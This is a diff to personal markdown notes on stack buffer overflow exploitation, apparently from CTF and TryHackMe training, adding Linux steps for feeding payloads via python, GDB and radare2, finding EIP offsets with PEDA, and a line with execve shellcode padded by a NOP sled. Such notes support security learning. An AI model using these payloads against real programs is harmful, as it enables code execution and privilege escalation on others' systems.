@@ -1,14 +1,44 @@
 # Buffer Overflow
 
-## Using a File As Input In Radare 2
+## Linux Applications
+
+### Send data to applications
+
+* Passing data from the command line
+    * `python -c "print 'A' * 40 + '\xef\xbe\xad\xde'" | ./executable`
+* Using a file as input in Radare 2
 ```bash
 echo -e "12345678901234\x67\x05\x40" > over.txt
 r2 -A -d ./executable
 dor stdin=over.txt
 doo
 ```
+* Sending stdin data in GDB
+    * `run < <(python -c "print 'A' * 40 + '\xef\xbe\xad\xde'")`
+* Sending address without needing to convert to little endian first
+    * `run < <(python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)')`
+* Sending some shell code with padding NOPs
+    * `python -c "from struct import pack; print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'.ljust(140,'\x90') +  pack('<L', 0xffffd0e0)"  > /tmp/var`
 
-## Windows Application
+### Find EIP Offset With PEDA
+* Install [PEDA](https://github.com/longld/peda)
+    * If you get an error 'Error in sourced command file' when running gdb, just reinstall it `apt install gdb`
+* Launch gdb
+* Create a pattern with PEDA
+    * `pattern create 200`
+* Run the program and use pattern as the input
+* After the program crashes, look at the value in EIP
+* Use the EIP value to get the offset
+    * `pattern offset <EIP Address>`
+
+
+### Resources 
+* [Stack Buffer Overflows: Linux - Chapter 1](https://reboare.github.io/bof/linux-stack-bof-1.html)
+* [Stack Buffer Overflows: Linux 2 - Using GDB](https://reboare.github.io/bof/linux-stack-bof-2.html)
+* [invoke.sh](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966)
+* [List of Linux/i386 system calls](http://asm.sourceforge.net/syscall.html)
+
+## Windows Applications
 
 Those are my notes taken after doing the [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep) room on TryHackMe.
 
